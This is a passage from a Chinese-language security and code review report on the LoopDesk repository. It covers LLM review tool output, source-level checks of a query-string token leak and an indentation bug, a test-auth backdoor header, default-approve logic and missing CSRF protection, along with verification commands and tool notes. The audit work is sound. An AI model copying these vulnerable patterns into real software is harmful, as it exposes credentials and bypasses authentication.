| 7 | LOW | performance | `connectors/knowledge_source.py:33` | Confluence `body.storage.value` 原样返回未净化 HTML，若前端以 `dangerouslySetInnerHTML` 渲染则构成 XSS 面 |
| 8 | LOW | maintainability | `connectors/__init__.py` | 空 `__init__.py`，无 `__all__`，模块公开接口不明确 |

**两点值得记录**

**① OCR 独立命中了孤儿问题——但只命中 1 个，别夸大成"7 个都命中了"。**
- **第 5 条**（`MCPConnectorManager` / `MCPCallTracer` 在生产代码 `src/` 中无任何导入，仅测试引用）与我在 §3.3 的符号级引用分析是**同一发现**，路径完全不同（它靠 LLM 读代码 + 自己搜引用；我靠 `rg` 统计定义文件外的生产引用）。两条独立路径收敛 ⇒ 这一条可信度最高。
- **第 6 条不是同一发现。** 它讲的是 `ConfluenceRestAdapter` / `JiraRestAdapter` / `KnowledgeSourceAdapter` 这些 **connectors 适配器类**，**不在这 8 个符号的名单里**。而且模型自己都加了限定（"仅在 `gateway/connectors.py` 中导入，但该文件本身的使用情况未知"）⇒ **这条我未复核，按未验证的提示对待。**
- **⇒ 8 个孤儿的其余 7 个，OCR 全部没报出来。**

**② 实证了「评论数 ≠ 缺陷数」。** 原始 11 条评论里有 **3 次重复**（同一发现被报了两次，且**严重度还不一致**）。

> **编号说明**：上表是**去重后的 8 条**。原 11 条评论的顺序未逐一列出；下表"第 2 次出现"指同一发现在原始输出里另有一条单独的评论。

| 对应上表 | 同一发现 | 两次的严重度/类型 |
|---|---|---|
| #3 的重复 | MCP 进程管理竞态 | `medium/security` vs `medium/other` |
| #4 的重复 | 子进程管道未管理 | `medium/security` vs **`high/other`** |
| #8 的重复 | 空 `__init__.py` | 两次 `low/maintainability`（措辞不同） |

⇒ **11 条评论 = 8 个独立发现 + 3 次重复**。原因已在工具源码中确证：`review` 模式**没有去重任务**，去重（`DEDUP_TASK`）只存在于 `scan` 模式且按批进行（`DEDUP_MIN_COMMENTS: 4`）。
**⇒ 不要拿评论总量当质量指标或门禁阈值。** 第 2 行这种"同一事实、两个严重度（`medium` 与 `high`）"的情况，会让按严重度排序的看板产生错觉。

**③ 一条工具侧的可信度信号**：运行中出现 1 次 `file_read failed: file "src/loopdesk/gateway/gates.py" not found` —— 模型自己编了一个不存在的路径（真实路径是 `src/loopdesk/governance/gates.py`）。工具正确地记了失败而没有静默吞掉（`tool_calls.failure: 1`）。

---

### 3.7 OCR Pass 2 的 LLM 发现（**13/19 文件有产出，其余 6 个零产出**）

**运行事实**

| 项 | 值 |
|---|---|
| 命令 | `ocr scan --path <19 个被修改文件> --concurrency 2`（scan 无 `--effort` / `--background-file`） |
| 终态 | **`completed_with_errors`**（第三种终态；exit code 仍为 **0**） |
| 覆盖率 | **19 尝试 / 13 有产出（68.4%）**（`summary.files_reviewed = 19` 是**尝试数**，不可直接用） |
| 评论 | **74 条**（结果 JSON 中 `comments` 长度即 74，无独立去重账本可对比） |
| 严重度 | **critical 2 / high 14 / medium 23 / low 35** |
| 类型 | bug 17 · security 12 · maintainability 21 · performance 8 · documentation 7 · other 6 · style 3 |
| tokens | 788,963（input 735,018 / output 53,945 / cache_read 403,200） |
| 墙钟 | 11m22s |
| 会话 id | `119d0ebc-5e05-4c30-9e53-cff8f0d85895` |

> **一个工具侧观察（本报告中最容易踩的坑）**：`scan` 的结果 JSON **schema 与 `review` 完全不同**——`scan` 顶层是 `status / llm / summary / tool_calls / comments / warnings / project_summary / session_id`，**没有 `manifest` 键，也就没有 `coverage` 与 `retry_report`**（`review` 三者都有）。因此 §7.6.1 讲的"用 `coverage` 判断覆盖率"**只对 `review` 有效**。
>
> 而 `scan` 唯一可用的覆盖率字段 `summary.files_reviewed = 19` **是骗人的**：它等于传入的文件数，**把因 429 报错、一条评论都没产出的文件也算作"已审"**。真正的产出必须用 **`comments[].path` 去重计数**（本次 = **13**）。另有一个陷阱：`comments` 数组里文件字段名是 **`path`**，不是 `file`（`warnings` 里才是 `file`）——**用错字段名会得到"所有文件 0 评论"的假结论**，本次复核脚本第一版就踩了这个坑。
>
> 另外 `scan` 的 `status` 实测出现了第三种值 **`completed_with_errors`**，而 exit code 仍是 **0**。**⇒ 两套 JSON 不能复用同一套解析逻辑，已记入手册 §7.6.1。**

**6 个"尝试了但零产出"的文件（因 `scan_subtask_error` + 429）**

| 文件 | 本轮 LLM 评论数 | 该文件承载的本报告结论 | 结论靠什么支撑 |
|---|---|---|---|
| `src/loopdesk/gateway/app.py` | **9**（部分轮次报错，仍有产出） | A5、B6 | OCR + 独立复核 |
| `src/loopdesk/gateway/tasks.py` | **0** | **A1、B5** | ⚠️ **仅独立复核** |
| `src/loopdesk/loop_workspace/schema.py` | **0** | 无 | — |
| `frontend/src/overlays/SessionDrawer.tsx` | **0** | 无 | — |
| `frontend/src/overlays/Modals.tsx` | **0** | 无 | — |
| `frontend/src/screens/ControlCenter.tsx` | **0** | B1（import 摆设之一） | ⚠️ **仅独立复核** |
| `frontend/src/screens/SettingsMcp.tsx` | **0** | B1（import 摆设之一） | ⚠️ **仅独立复核** |

> **注意最后三行的含义**：A1（门自证）与 B5（收据被覆盖）这两条**阻断级**结论，**没有任何 LLM 审查支撑**——`tasks.py` 在本轮就是零产出的。它们完全建立在 §3.1 / §3.3 的源码级复核之上。这一点必须讲清楚，否则"19/19 覆盖"会给人一个不存在的信心水平。
> 同理，B1 里 `ControlCenter.tsx` / `SettingsMcp.tsx` 两个屏幕的"import 摆设"判定也只来自我自己的 `grep -c`（那两个屏幕在本轮是零产出）。**这恰好说明：LLM 覆盖率不是"能不能下结论"的前提，但它决定了哪条结论有第二来源。**

**critical + high 全列表（16 条，均附位置）**

| 严重度 | 类型 | 位置 | 发现 | 交叉命中 |
|---|---|---|---|---|
| **CRITICAL** | bug | `loop_workspace/service.py:481-498` | **`_load_context_file` 缩进错误**：`return payload` 在 `for` 循环体内 ⇒ 只解析第一条键值对，其余丢失 | ✅ **已复核见 §3.8 A4** |
| **CRITICAL** | security | `gateway/app.py:168-177` | `_extract_http_token` 从 `request.query_params.get("token")`（`:177`）取值 ⇒ 令牌进日志 | ✅ **已复核见 §3.8 A5** |
| HIGH | security | `loop_workspace/service.py:459-474` | `record_gate_receipt` 里 `decision = receipt_data.get("operator_decision", "approved")` **默认 "approved"** ⇒ 缺字段即视为通过 | ✅ **与 §3.1 A1 同源**（模型还引用了我喂的 background 不变量原文） |
| HIGH | security | `gateway/app.py:178, 192-198` | `resolve_auth` 返回 None 时回退构造 `authenticated=False` 但 **`role="operator"`** 的 Principal（`role_claim` 形参默认 `"operator"`）⇒ 未认证请求以操作者身份继续 | — |
| HIGH | security | `gateway/app.py:244, 261-268` | `/api/approvals` 把 `argv` / `command` 明文回给前端，未认证也可调 | — |
| HIGH | security | `gateway/app.py:336-340` | `namespace` 未做白名单校验，可落入非预期 RPC 路由 | — |
| HIGH | security | `gateway/app.py:362-369` | `api_elevated_mode` 是写端点但无 CSRF 防护 | — |
| HIGH | bug | `gateway/app.py:427` | `api_chat_history` 的 `sessionKey` 默认 `"agent:main:webchat:default"` ⇒ 匿名请求可能拿到他人会话历史 | — |
| HIGH | security | `gateway/projects.py:12-13` | 模块级可变状态 `_PROJECTS` / `_ACTIVE_MCP_CONNECTORS` 在异步运行时存在竞态 | 同型：`frontend/src/data.ts` |
| HIGH | security | `gateway/projects.py:73-74` | `create_project` 静默覆盖同 `id` 已有项目（含 `default`） | — |
| HIGH | bug | `frontend/src/lib/api.ts:208-215` | **`validateTaskCreation` 语义反转**：`!res.ok` 时返回 `{ ok: true }` ⇒ 校验失败被当成功 | — |
| HIGH | bug | `frontend/src/data.ts:171-177` | `RUNTIME`/`CURRENT_PROJECT_ID`/`OVERRIDDEN` 等模块级 `let` 无防护，多实例互相污染 | — |
| HIGH | security | `frontend/src/components/TopBar.tsx:94-101` | projects 为空时回落到硬编码示例项目（`Acme Platform` 等） | ✅ 违反喂入的「不得伪造数据层状态」 |
| HIGH | bug | `frontend/src/screens/TaskDetail.tsx:225-255` | `copyHostCommand` 异步错误被 `void` 吞掉、失败时按钮不恢复、用已废弃 `execCommand` | — |
| HIGH | bug | `frontend/src/screens/TeamAssets.tsx:291-307` | "搜索框"实为**静态 `<div>`，无 `<input>`、无 `onChange`**，输入无响应 | ✅ 与 §3.4 同一屏幕 |
| HIGH | bug | `frontend/src/screens/TeamAssets.tsx:131` | 预览面板 `CloseIcon.onClick` 为空无法关闭；`AssetTile` 有 `cursor:pointer` 但无 `onClick`；Preview 用硬编码数据 | ✅ 与 §3.4 同一屏幕 |

**三条值得单独说的**

1. **`_load_context_file` 是真缺陷，不是误报。** 我逐行读了 `service.py:481-498`：`return payload` 与循环体同缩进（8 空格），且 `:304` 的 `get_context_pack` 真实调用它。**⇒ 每个 context 文件只贡献第一条键值对。** 这条**不在**既有三轮审计记录里，是本轮新增的有效发现。

2. **模型会引用你喂进去的不变量。** 第 3 条（`operator_decision` 默认 `"approved"`）的评论里直接写了"产品要求：裁决收据只能在真实证据齐备时签发……"。**⇒ `--background` 不是客套，它真的在改变模型的注意力分配**，并把"我已知的坑"变成"它专门去找的坑"。

3. **`TeamAssets.tsx` 的 3 条评论（2 high + 1 medium）与 §3.4 的 import 摆设互为因果。** 这个屏幕 import 了 `listMarketplaceAssets` / `distributeAsset` 却从不调用（OCR 还专门为这条 `:1` 报了一条 **medium**，**与我的 `grep -c` 结论一致**），于是资产列表必然来自画布种子数据、搜索框必然是装饰、Preview 必然无法交互 —— **"未接线"与"界面不可用"在代码上指向同一件事**。（此屏幕在 Pass 1 里因 `SettingsShell` 等文件被判 `provider` 失败而未覆盖，Pass 2 补上了。）

---

### 3.8 A4 + A5 — 两条 CRITICAL 的源码复核

这两条既在 §1 摘要里，又是本报告**唯一"OCR 报 CRITICAL + 我逐行复核确认"的双来源结论**，因此单列。

**A4 — `_load_context_file` 缩进错误（`loop_workspace/service.py:481-498`）**

```python
def _load_context_file(path: Path) -> dict[str, object]:
    payload: dict[str, object] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        match = re.match(r"^([A-Za-z0-9_\-]+)\s*:\s*(.+)$", line.strip())
        if not match:
            continue
        key, value = match.group(1), match.group(2).strip()
        if value.lower() in {"true", "false"}:
            payload[key] = value.lower() == "true"
        else:
            try:
                payload[key] = int(value)
            except ValueError:
                try:
                    payload[key] = float(value)
                except ValueError:
                    payload[key] = value
        return payload          # ← 与 for 循环体同缩进（8 空格）⇒ 第一次命中就返回
```

**复核结论**：`return payload` 的缩进是 8 空格，与 `for` 体同级 ⇒ **函数在处理第一个可解析行后就返回**，其余行全部丢弃。调用方是 `:304` 的 `get_context_pack`（`context[key] = _load_context_file(path)`），用于 `user` / `project` / `task` 三个 context 文件。**⇒ 三个 context 文件各只剩第一条键值对。**

**为什么这条重要**：它**不在**既有三轮审计的记录里，是本轮新增。修复成本是"移动一行缩进"，但影响所有 context pack 的完整性。**这是本报告里性价比最高的一条。**

**A5 — 认证令牌可从 URL query 读取（`gateway/app.py:168-177`）**

```python
def _extract_http_token(request: Request | None) -> str | None:
    if request is None:
        return None
    auth_header = request.headers.get("authorization", "")
    if auth_header.startswith("Bearer "):
        return auth_header[7:]
    token_header = request.headers.get("x-loopdesk-token")
    if token_header:
        return token_header
    return request.query_params.get("token")     # ← :177
```

**复核结论**：前两条路径（`Authorization: Bearer`、`x-loopdesk-token`）都正确；第三条把 **query string** 也当凭据来源。而 `_extract_http_token` 被 `_make_ctx` 用于**每一个** HTTP 端点。

**后果**：`?token=<secret>` 会进入服务端访问日志、反向代理日志、浏览器历史、`Referer` 头。**⇒ 这是"凭据投递通道"级别的缺陷，不是风格问题。** 修复：删除 `:177` 这一行即可（前两条路径保留）。

---

## 4. 工具侧观察：一轮失败的完整记录

这一节记录的是**工具使用方法**问题，不是被测代码的问题，但它对后续使用有价值，故保留。

| 项 | 值 |
|---|---|
| 首次运行参数 | `review --commit b45ea292 --effort high --concurrency 8`，同时并行跑 `scan --concurrency 4` |
| 结果 | `status: failed`，`Error: review failed: context canceled`，`comments: null` |
| 已消耗 | 62 文件 / **530,903 tokens**（input 518,323 / output 12,580）/ cache_read 176,128 / 4m58s |
| 会话内 429 计数 | **95 次** |
| 根因 | 12 路并发打同一端点（8 + 4）触发 provider 限流 |

**限流的真实形态**（实测）：

```
HTTP 429
{"code":429,"message":"The rate exceeds the limit. Please try again later"}
Retry-After: 142        ← 逐次递减，是时间窗限流，会自动恢复
```

**容量实测**：同一窗口内单发 / 2 路 / 4 路均成功（累计 11 次），紧接 4 路**全部 429**。⇒ 该 key 每窗口约放行 **11 次请求**。

**一个重要澄清**：`ocr` **本来就自动重试 429**。源码确证 SDK 默认重试码为 `408` / `409` / `429` + 全部 5xx；配置 `retry_codes` 写 429 会被过滤并告警 `retry code 429 is unnecessary (SDK already retries it) and will be ignored`。
**⇒ 失败的原因不是"没重试"，而是"重试也追不上 12 路并发制造的失败速率"。** 正确处置是**降并发**，不是加重试。

**已固化的做法**：`--concurrency 2`（限流环境）、`--timeout 30`（退避等待会计入单任务超时）、两个 pass 串行而非并行。

---

## 5. 方法学备注：三次"搜不到 / 搜到"型的假结论（都已复核纠正）

本次审查中我犯了**三次同类错误，方向各不相同**。记录下来，因为它们**会直接改变审查结论**。

| # | 错误 | 表现 | 根因 | 纠正后真值 |
|---|---|---|---|---|
| 1 | **假阴性**（文本） | `grep -rn "X-LoopDesk-Test-Auth\|test-authorized" src/` → **0 命中**，据此写下"后门已移除" | macOS BSD grep **不支持 `\|` 交替**，`\|` 被当字面量，静默返回 0 | 后门**仍在** `orchestration.py:40` |
| 2 | **假阳性**（文本） | 裸子串 `ContextResolver` 命中 7 处 → 判"不是孤儿" | 命中的是 `ExtraContextResolver`（另一个类） | 仍是孤儿 |
| 3 | **假阴性**（JSON 字段名） | 用 `comments[].file` 统计产出文件 → **全部文件都显示 0 条评论**，据此差点写下"19/19 覆盖不成立" | 评论数组的字段名是 **`path`**；`warnings` 里才是 `file`。`x.get('file')` 对评论恒为 `None` | 有产出 = **13**，零产出 = **6** |

**统一判据**：
- 要"或"匹配，用 **`grep -E "a|b"`**，或直接用 ripgrep（Grep 工具）。
- 判断"某符号是否存在/是否被引用"，**禁止裸子串计数**；用词边界或全词模式，并**抽至少 1 处命中打印上下文肉眼确认**。
- 更一般地：**"搜不到"与"搜到了"两个方向都要复核一次再落笔**——它们是对称的失效通道。本次**三种形态全部触发**（文本假阴性、文本假阳性、JSON 字段名假阴性）。

---

## 6. 建议的修复顺序与后续范围

### 6.1 修复顺序（按"不修就无法相信其它结论"排序）

1. **A2（PTY）** —— 删除测试旁路、删除默认密钥、重做白名单模型、给 write/read/terminate 加鉴权与归属校验。这是唯一**可被远程利用**的一项。
2. **A1 + A3 + B5（门自证 / 谎报已过闸 / 覆盖顺序）** —— 证据字段改为服务端产生，默认值改为朝拒绝，空作用域改为报错，`upsert_task` 不得覆盖收据算出的 `gate_status`，`_gate_status_for` 不得对未裁决状态返回 `passed`。**在此之前，任何"已过闸"的展示都没有意义。**
3. **A5 + B6（凭据与端点鉴权）** —— 令牌移出 URL query；`_make_ctx` 不得给未认证请求 `operator` 角色；`/api/approvals` 收窄字段；`api_elevated_mode` 加 CSRF；`namespace` 加白名单。
4. **A4（context 文件只读一行）** —— 一行缩进的修复，但影响所有 context pack。优先级高是因为**修复成本极低、收益明确**。
5. **B4（状态落盘）** —— 流程状态写入 `LOOP-STATE.json`，并补一个**独立进程**的实测。
6. **B1 + B8（前端接线与屏幕可用性）** —— `TeamAssets` 等 4 个屏幕接上真实调用点并补齐交互；或把 import 撤掉，不要留下误导性的"已接线"痕迹。
7. **B7 + B9（前端一致性）** —— `validateTaskCreation` 语义反转、硬编码示例项目回落。
8. **B3（孤儿）** —— 要么接线，要么从能力清单里移除。**有测试不等于有功能。**

### 6.2 验收口径建议（本次审查的直接产物）

`pytest N passed` 与 `npm run build 成功` **在本仓库都不足以作为完成证据**：
- ⚠️ `noUnusedLocals: false` ⇒ build 通过不检查未使用 import
- ⚠️ 测试可以只引用孤儿模块（8 个孤儿符号中，7 个仅被测试引用、1 个连测试都没有 ⇒ 测试全绿与它们是否可用无关）

**更直接的做法**：把 `frontend/tsconfig.json` 的 `noUnusedLocals` 临时设为 `true` 跑一次 `tsc --noEmit`，即可得到一份"疑似未接线"清单（本次 9 个符号会全部出现在其中）。

建议每项声称完成时附：① 可复现命令与输出 ② **自身目录外的生产调用点**（`文件:行号`）③ `LOOP-STATE.json` 前后 diff ④ commit hash。

### 6.3 若要覆盖存量 185,776 行

按模块分批，每批建议不超过 20 个文件，命令见附录。注意本次实测的限流容量（约 11 请求/窗口），大批量必须低并发并接受较长墙钟时间。

### 6.4 流程建议：报告与代码必须在同一提交内互相可验证

§3.5.1 是本次最值得当流程教训看的一节。那份修复报告的问题不是"写得夸张"，而是**它描述的机制有一个根本不存在**（`ALLOWED_PTY_COMMANDS`），且测试数字无法用 `pytest --collect-only` 复现。

**可直接落地的三条**：

1. **报告里每一条"已修复"必须带一条可复跑命令**（如 `grep -n` 的期望输出、或 `pytest <nodeid> -v` 的实际收集数）。**没有期望输出的声称等于没有声称。**
2. **提测数用 `pytest --collect-only -q | tail -1` 而不是手写**。手写的"6/6"与静态 `def test_` 数（4）不符，是最好抓的一类失真。
3. **引用类名/函数名前先做一次全仓 grep**。本次三个虚构名（`ALLOWED_PTY_COMMANDS` / `MemoryDreamEngine` / `KnowledgeBaseManager`）**任一次 grep 都能发现**——它们的真实对应物分别是 `ALLOWED_COMMANDS`、以及并不存在的实现。

---

## 附录：可复跑的完整命令

```bash
OCR=/Users/freecisco_yan/.npm-global/bin/ocr
cd /Users/freecisco_yan/Documents/trae_projects/savus

# 背景文件：项目不变量（必须无 ` 与 $，否则被 shell 当命令替换）
# 见 /tmp/ocr-review/background.md

# Pass 1 —— Phase 2 全提交（低并发；限流环境下勿超 2）
$OCR review --commit b45ea292 \
  --audience agent --format json --effort high \
  --concurrency 2 --timeout 30 \
  --max-tokens-budget 5000000 \
  --background-file /tmp/ocr-review/background.md \
  --output /tmp/ocr-review/p1-phase2.json

# Pass 2 —— 被修改文件的全文件扫描（scan 没有 --effort / --background-file）
BG="$(cat /tmp/ocr-review/background-inline.txt)"
$OCR scan \
  --path "frontend/src/App.tsx,frontend/src/components/LeftRail.tsx,...,src/loopdesk/gateway/tasks.py" \
  --audience agent --format json --concurrency 2 \
  --max-tokens-budget 3000000 --background "$BG" \
  --output /tmp/ocr-review/p2-scan-modified.json

# 会话回看与导出（可离线打开的单文件 HTML）
$OCR session list
$OCR session show <session-id>
$OCR session export <session-id> -o review.html
$OCR viewer
```

**独立复核的可复跑命令**（不依赖 OCR）：

```bash
# A2 后门（注意：必须用 -E，BSD grep 不支持 \|）
grep -nE "X-LoopDesk-Test-Auth|LOOPDESK_ADMIN_KEY" src/loopdesk/gateway/orchestration.py

# A1 门自证
sed -n '330,343p' src/loopdesk/gateway/tasks.py

# A3 谎报已过闸
sed -n '29,35p;171p' src/loopdesk/loop_workspace/service.py

# B1 前端 import 摆设（应各出现 1 次）
grep -c "fetchConnectorTasks" frontend/src/screens/SettingsMcp.tsx

# B2 build 零信息量
grep -n noUnusedLocals frontend/tsconfig.json

# B3 孤儿（用 ripgrep，勿用裸子串）
rg -n "evaluate_stop_conditions|WorktreeFanOutExecutor|ThreeTierMemory|run_memory_dream|ContinuousLearningEngine|HandoffEnveloper|MCPConnectorManager" src/ frontend/src/
```

**统计 scan 真实产出覆盖率（勿用 `summary.files_reviewed`）**：

```bash
python3 -c "
import json, collections
d = json.load(open('/tmp/ocr-review/p2-scan-modified.json'))
c = d['comments']
print('有产出文件数:', len({x['path'] for x in c}), '/ 传入 19')
print('评论总数:', len(c))
print('零产出文件(429):', [w['file'] for w in d['warnings'] if w.get('type') == 'scan_subtask_error'])
print('scan 顶层键(无 manifest):', list(d.keys()))
"
```
> ⚠️ 注意 `comments[].path` 与 `warnings[].file` **字段名不同**——写错会得到"全 0"的假结论。

**核对 §3.5.1（修复报告的声称 vs 实测）**：

```bash
# 1) 虚构类名 —— 应为 0 命中（SafeConditionEvaluator 是唯一真实存在的，2 处）
grep -rnE "ALLOWED_PTY_COMMANDS|MemoryDreamEngine|KnowledgeBaseManager" src/ --include='*.py'
grep -rn "ALLOWED_COMMANDS" src/loopdesk/gateway/orchestration.py     # 真名，应命中

# 2) 测试数虚增 —— 静态 def test_ 计数（⚠️ BSD grep 不支持 \s，用 [[:space:]]）
grep -cE '^[[:space:]]*(async )?def test_' tests/test_p1_features.py   # 报告称 6，实测 4
grep -rhcE '^[[:space:]]*(async )?def test_' tests/test_orchestration  # 报告称 8，实测 7
grep -rhcE '^[[:space:]]*(async )?def test_' tests/test_connectors     # 报告称 8，实测 7

# 3) 确认差异不是 parametrize 造成的
grep -nE "parametrize" tests/test_p1_features.py                        # 应无输出

# 4) 修复报告确实在该提交内
git show --name-only --format="" b45ea292 | grep remediation

# 5) 422 分支存在但永不触发（门自证）
sed -n '343,368p' src/loopdesk/gateway/tasks.py
```

---

*本报告由 `ocr v1.12.9` 审查 + 源码级独立复核生成。工具使用手册见 `~/.workbuddy/skills/open-code-review/USAGE.zh.md`。*
